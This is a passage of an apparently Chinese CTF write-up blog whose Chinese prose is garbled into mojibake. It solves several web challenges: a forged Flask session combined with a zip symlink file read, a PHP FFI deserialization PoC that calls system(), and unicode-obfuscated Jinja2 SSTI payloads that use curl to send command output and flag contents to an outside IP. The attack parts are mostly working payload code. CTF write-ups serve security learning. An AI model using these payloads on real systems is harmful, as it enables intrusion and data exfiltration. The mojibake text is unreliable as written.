<p>å¯ä»¥å‘ç°æ˜¯æ­£ç¡®çš„å‘¢ï¼Œé‚£å°±ç›´æ¥ä¼ªé€ å•¦ï¼ˆè¿™é‡Œæ˜¯è¯•äº†å¥½å¤šæ¬¡ä¹‹åï¼Œéƒ½ä¸å¯¹ï¼Œçœ‹äº†åˆ«çš„å¸ˆå‚…çš„wpä¹‹å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;id&#x27;: b&#x27;1&#x27;, &#x27;is_login&#x27;: True, &#x27;password&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;admin&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å¾—åˆ°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.Yek0bA.1lnXSowFDjHbyuAnUGKfWtYEN84</span><br></pre></td></tr></table></figure>

<p>æŠ“åŒ…ä¿®æ”¹ä¹‹åå°±è·å¾—äº†æ–‡ä»¶ä¸Šä¼ çš„æƒé™ï¼Œçœ‹æºç å¯ä»¥å¾—åˆ°æ–‡ä»¶ä¸Šä¼ çš„pythonæºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;id&#x27;</span>] != <span class="string">b&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(temp)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        name = session[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        name = name+<span class="string">&#x27;qweqweqwe&#x27;</span></span><br><span class="line">        name = name.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        m.update(name)</span><br><span class="line">        md5_one= m.hexdigest()</span><br><span class="line">        n = hashlib.md5()</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        ip = ip.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        n.update(ip)</span><br><span class="line">        md5_ip = n.hexdigest()</span><br><span class="line">        f=request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = basepath+<span class="string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="string">&#x27;/&#x27;</span>+md5_one+<span class="string">&#x27;/&#x27;</span>+session[<span class="string">&#x27;username&#x27;</span>]+<span class="string">&quot;/&quot;</span></span><br><span class="line">        path_base = basepath+<span class="string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="string">&#x27;/&#x27;</span></span><br><span class="line">        filename = f.filename</span><br><span class="line">        pathname = path+filename</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;zip&quot;</span> != filename.split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>]: <span class="comment"># åªèƒ½ä¸Šä¼ zipæ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;zip only allowed&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path_base): <span class="comment"># åˆ›å»ºè·¯å¾„</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path_base)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pathname):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.save(pathname)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="string">&quot;unzip -n -d &quot;</span>+path+<span class="string">&quot; &quot;</span>+ pathname</span><br><span class="line">            <span class="keyword">if</span> cmd.find(<span class="string">&#x27;|&#x27;</span>) != -<span class="number">1</span> <span class="keyword">or</span> cmd.find(<span class="string">&#x27;;&#x27;</span>) != -<span class="number">1</span>: <span class="comment"># å¦‚æœå­˜åœ¨|æˆ–è€…;</span></span><br><span class="line">				waf()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">            os.system(cmd)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        unzip_file = zipfile.ZipFile(pathname,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        unzip_filename = unzip_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&#x27;is_login&#x27;</span>] != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;not login&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> unzip_filename.find(<span class="string">&#x27;/&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">                shutil.rmtree(path_base)</span><br><span class="line">                os.mkdir(path_base)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">            image = <span class="built_in">open</span>(path+unzip_filename, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">            resp = make_response(image)</span><br><span class="line">            resp.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/png&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            shutil.rmtree(path_base)</span><br><span class="line">            os.mkdir(path_base)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/showflag&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showflag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span> == <span class="literal">False</span>:</span><br><span class="line">        image = <span class="built_in">open</span>(os.path.join(<span class="string">&#x27;./flag/flag.jpg&#x27;</span>), <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        resp = make_response(image)</span><br><span class="line">        resp.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/png&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;can&#x27;t give you&quot;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çŸ¥é“uploadè·¯ç”±é‡Œè¿›è¡Œæ–‡ä»¶ä¸Šä¼ å¹¶ä¸”å¯¹æ–‡ä»¶è§£å‹ç¼©ä¹‹åæŸ¥çœ‹æ–‡ä»¶å†…å®¹</p>
<p>è€Œshowflagè·¯ç”±é‡Œé¢ï¼Œç”±äºifæ¡ä»¶æ°¸å‡ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•é€šè¿‡è¯¥è·¯ç”±è·å–flagï¼Œä½†æ˜¯è¿™ä¸ªè·¯ç”±å‘Šè¯‰æˆ‘ä»¬flagæ–‡ä»¶æ‰€åœ¨çš„è·¯å¾„<code>./flag/flag.jpg</code></p>
<p>ä¹‹åçœ‹äº†åˆ«çš„å¸ˆå‚…çš„wpï¼š<a href="https://blog.csdn.net/SopRomeo/article/details/108334393">å‚è€ƒ</a>è¿™é‡Œæåˆ°äº†<a href="https://www.cnblogs.com/sueyyyy/p/10985443.html">è½¯è¿æ¥çš„ä½¿ç”¨</a></p>
<p>å‘½ä»¤ï¼šï¼ˆæ³¨æ„ è¿™é‡Œçš„flagæ–‡ä»¶éœ€è¦ç»å¯¹è·¯å¾„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /proc/self/cwd/flag/flag.jpg test</span><br><span class="line">zip -ry test.zip test</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ æ–‡ä»¶ï¼ŒæŠ“åŒ…å¾—åˆ°flag</p>
<p><img src="https://img-blog.csdnimg.cn/d6568ca2918447169f9bdc80a110e0fd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h4><ul>
<li>php FFIæ‰©å±•</li>
</ul>
<p>ä»£ç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…ˆçœ‹çœ‹phpinfoé‡Œé¢ç»™äº†æˆ‘ä»¬ä»€ä¹ˆä¿¡æ¯ï¼Œç»å…¸å¸¸ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°éƒ½è¢«banäº†</p>
<p><img src="https://img-blog.csdnimg.cn/e70fbdace5f043f8b31be121c1602434.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>éšä¾¿å°è¯•ä¸€ä¸‹ï¼Œå¾ˆå¤šå‡½æ•°ä¾‹å¦‚var_dump,print_r,echo,file_get_contents,file_put_contentséƒ½æ²¡æœ‰è¢«banï¼Œè¿˜æ˜¯æœ‰æœºä¼šçš„ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=var_dump(scandir(&#x27;.&#x27;));</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; [3]=&gt; string(11) &quot;preload.php&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æ–‡ä»¶ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=file_get_contents(&quot;/var/www/html/preload.php&quot;);</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;print_r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;ret&#x27;</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;func&#x27;</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span>(<span class="params"></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, <span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> (<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[<span class="variable">$key</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> (<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è™½ç„¶è¿™é‡Œå¯ä»¥åˆ©ç”¨<code>$this-&gt;data[&#39;ret&#39;] = $this-&gt;data[&#39;func&#39;]($this-&gt;data[&#39;arg&#39;]);</code>æ¥æ‰§è¡Œå‡½æ•°ï¼Œä½†æ˜¯æœ€é‡è¦çš„è¿˜æ˜¯å¾ˆå¤šå‡½æ•°è¢«banäº†</p>
<p>è¿™é‡Œè¦ç”¨åˆ°phpçš„ä¸€ä¸ªæ‰©å±•<a href="https://www.jianshu.com/p/c1f268aaf791/">FFIæ‰©å±•</a>ï¼Œå®ƒæ”¯æŒphpè°ƒç”¨cçš„ä»£ç </p>
<p>FFI::cdef([string ![cdef = â€œâ€ <a href="https://math.jianshu.com/math?formula=cdef%20=%20%22%22%20%5B,%20string">, string</a>lib = null]]): FFI</p>
<p>æ‰€ä»¥å¯ä»¥æ„é€ pocï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;FFI:cdef&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;int system(char* command)&#x27;</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment"># C%3A1%3A%22A%22%3A87%3A%7Ba%3A3%3A%7Bs%3A3%3A%22ret%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A8%3A%22FFI%3Acdef%22%3Bs%3A3%3A%22arg%22%3Bs%3A25%3A%22int+system%28char%2A+command%29%22%3B%7D%7D</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=unserialize(urldecode(&#x27;C%3A1%3A%22A%22%3A89%3A%7Ba%3A3%3A%7Bs%3A3%3A%22ret%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A9%3A%22FFI%3A%3Acdef%22%3Bs%3A3%3A%22arg%22%3Bs%3A26%3A%22int+system%28char+%2Acommand%29%3B%22%3B%7D%7D&#x27;))-&gt;__serialize()[&#x27;ret&#x27;]-&gt;system(&#x27;cat /flag&gt;/var/www/html/1.txt&#x27;);</span><br></pre></td></tr></table></figure>

<h4 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h4><p>ç¬¬ä¸€å‘¨ç»“æŸäº†ï¼Œæ„Ÿè§‰å­¦åˆ°çš„æ–°çŸ¥è¯†ä¹Ÿä¸æ˜¯å¾ˆå¤šï¼Œå¾ˆå¤šé‡åˆ°çš„æ–°çŸ¥è¯†éƒ½æ²¡æœ‰å½»åº•ç†è§£ï¼Œä¸‹å‘¨æ•ˆç‡è¦é«˜ä¸€ç‚¹äº†</p>
<p>~</p>
]]></content>
      <categories>
        <category>é›†è®­</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buuåˆ·é¢˜</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF2022 07èµ‹èƒ½èµ›</title>
    <url>/2022/07/25/DASCTF2022-07%E8%B5%8B%E8%83%BD%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="é˜Ÿä¼åç§°"><a href="#é˜Ÿä¼åç§°" class="headerlink" title="é˜Ÿä¼åç§°"></a>é˜Ÿä¼åç§°</h1><p>TeamGipsy</p>
<h1 id="æ’å"><a href="#æ’å" class="headerlink" title="æ’å"></a>æ’å</h1><h1 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Ez-to-getflag"><a href="#Ez-to-getflag" class="headerlink" title="Ez to getflag"></a>Ez to getflag</h3><p><img src="https://img-blog.csdnimg.cn/f8f84b60f3bb4ffe977d766ca69e1bfd.png" alt="img"></p>
<p>ç›´æ¥æœç´¢/flagï¼Œå¾—åˆ°flag</p>
<h3 id="Harddisk"><a href="#Harddisk" class="headerlink" title="Harddisk"></a>Harddisk</h3><blockquote>
<p>å¤ç°</p>
</blockquote>
<p>è¿‡æ»¤äº†äº¿ä¸ªå­—ç¬¦ï¼Œç”šè‡³<code>x|g</code>ä¸¤ä¸ªå­—æ¯ä¹Ÿè¢«è¿‡æ»¤äº†ï¼ˆäººå¿ƒé™©æ¶</p>
<p>ä¸€äº›å…³é”®è¯å¯ä»¥åˆ©ç”¨unicodeç¼–ç ç»•è¿‡ï¼Œå› ä¸ºprintè¢«è¿‡æ»¤äº†æ‰€ä»¥è¿™é‡Œçš„ç”¨curlå¤–å¸¦ã€‚ä½†æ˜¯æ²¡æœ‰æ‰“é€š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%set%0apo=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;%set%0appp=dict(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;%set%0ahua=&quot;\u005f&quot;%&#125;</span><br><span class="line">&#123;%set%0aa=&quot;\u0067\u006c\u006f\u0062\u0061\u006c\u0073&quot;%&#125;</span><br><span class="line">&#123;%set%0ab=(hua,hua,a,hua,hua)|join%&#125;</span><br><span class="line">&#123;%set%0ao=dict(o=a,s=a)|join%&#125;</span><br><span class="line">&#123;%set%0aca=dict(ca=a,t=a)|join%&#125;</span><br><span class="line">&#123;%set%0aaop=&quot;\u0069\u006e\u0064\u0065\u0078&quot;%&#125;</span><br><span class="line">&#123;%set%0abin=(hua,hua,dict(built=a,ins=a)|join,hua,hua)|join%0a%&#125;</span><br><span class="line">&#123;%set%0acr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;%set%0ae=&quot;\u0067\u0065\u0074&quot;%&#125;</span><br><span class="line">&#123;%set%0alo=&quot;\u0067\u006c\u006f\u0062\u0061\u006c\u0073&quot;%&#125;</span><br><span class="line">&#123;%set%0aals=(hua,hua,lo,hua,hua)|join%&#125;</span><br><span class="line">&#123;%set%0achcr=(lipsum|attr(b))|attr(e)(bin)|attr(e)(cr)%&#125;</span><br><span class="line">&#123;%set%0af=chcr(47)%&#125;</span><br><span class="line">&#123;%set%0ard=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;%set%0aspace=chcr(32)%0a%&#125;</span><br><span class="line">&#123;%set%0apt=chcr(46)%&#125;</span><br><span class="line">&#123;%set%0afll=&quot;\u0066\u006c\u0061\u0067&quot;%&#125;</span><br><span class="line">&#123;%set%0amh=&quot;:&quot;%&#125;</span><br><span class="line">&#123;%set%0atest=dict(whoami=a)|join%&#125;</span><br><span class="line">&#123;%set%0aw=lipsum|attr(als)|attr(e)(o)|attr(ppp)(test)|attr(rd)()%&#125;</span><br><span class="line">&#123;%set%0acmd=(dict(curl=a)|join,space,dict(http=a)|join,mh,f,f,82,pt,156,pt,2,pt,166,mh,5657,f,w)|join%&#125;</span><br><span class="line">&#123;%set%0ashell=(lipsum|attr(als))|attr(e)(o)|attr(ppp)(cmd)%&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ«çš„å¸ˆå‚…çš„æ­£ç¡®çš„<code>payload</code>ï¼ˆèƒ½ç†è§£ï¼Œä½†æ˜¯æ²¡æƒ³åˆ°ğŸ¥€ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%if(lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f&quot;)(&quot;\u006f\u0073&quot;)|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0063\u0075\u0072\u006c\u0020\u0038\u0032\u002e\u0031\u0035\u0036\u002e\u0032\u002e\u0031\u0036\u0036\u003a\u0032\u0033\u0033\u0033\u002f\u0060\u0063\u0061\u0074\u0020\u002f\u0066\u0031\u0061\u0067\u0067\u0067\u0067\u0068\u0065\u0072\u0065\u0020\u007c\u0062\u0061\u0073\u0065\u0036\u0034\u0060&quot;))%&#125;test&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨ä¸‡èƒ½forå¾ªç¯æ„é€ payload</p>
<p><a href="https://www.cnblogs.com/hetianlab/p/14154635.html">https://www.cnblogs.com/hetianlab/p/14154635.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Â &#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123;c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;) &#125;&#125;&#123;%endif%&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ä¸­é—´çš„<code>&#123;&#123;â€¦â€¦&#125;&#125;</code>éœ€è¦æ”¹æˆ<code>&#123;%â€¦â€¦%&#125;</code>ï¼Œunicodeç¼–ç ç»•è¿‡ï¼Œç”¨<code>__getitem__</code>ä»£æ›¿ä¸­æ‹¬å·</p>
<p>ç›¸åº”çš„payloadç±»ä¼¼ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(433).__init__.__globals__.popen(&#x27;whoami&#x27;).read()&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥éœ€è¦æ„é€ çš„payloadä¸ºï¼ˆæ³¨æ„evalå¤„ä¹Ÿè¦åŠ ä¸Šï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Â &#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123;c.__init__.__globals__.__getitem__(__builtins__).__getitem(eval)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;) &#125;&#125;&#123;%endif%&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>æ„é€ æœ€ç»ˆpayloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%for%0ac%0ain%0a&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;)()%&#125;&#123;%if%0a(c|attr(&quot;\u005f\u005f\u006e\u0061\u006d\u0065\u005f\u005f&quot;))==&quot;\u0063\u0061\u0074\u0063\u0068\u005f\u0077\u0061\u0072\u006e\u0069\u006e\u0067\u0073&quot;%&#125;&#123;%if%0a(c|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u0063\u0075\u0072\u006c\u0020\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0038\u0032\u002e\u0031\u0035\u0036\u002e\u0032\u002e\u0031\u0036\u0036\u003a\u0032\u0033\u0033\u0033\u002f\u0060\u0077\u0068\u006f\u0061\u006d\u0069\u0060\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&quot;)%&#125;aaa&#123;%%0aendif%0a%&#125;&#123;%%0aendif%0a%&#125;&#123;%%0aendfor%0a%&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ç»å¯¹é˜²å¾¡"><a href="#ç»å¯¹é˜²å¾¡" class="headerlink" title="ç»å¯¹é˜²å¾¡"></a>ç»å¯¹é˜²å¾¡</h3><blockquote>
<p>å¤ç°</p>
</blockquote>
<p>ä»jsæ–‡ä»¶ä¸­å‘ç° SUPERAPI.php</p>
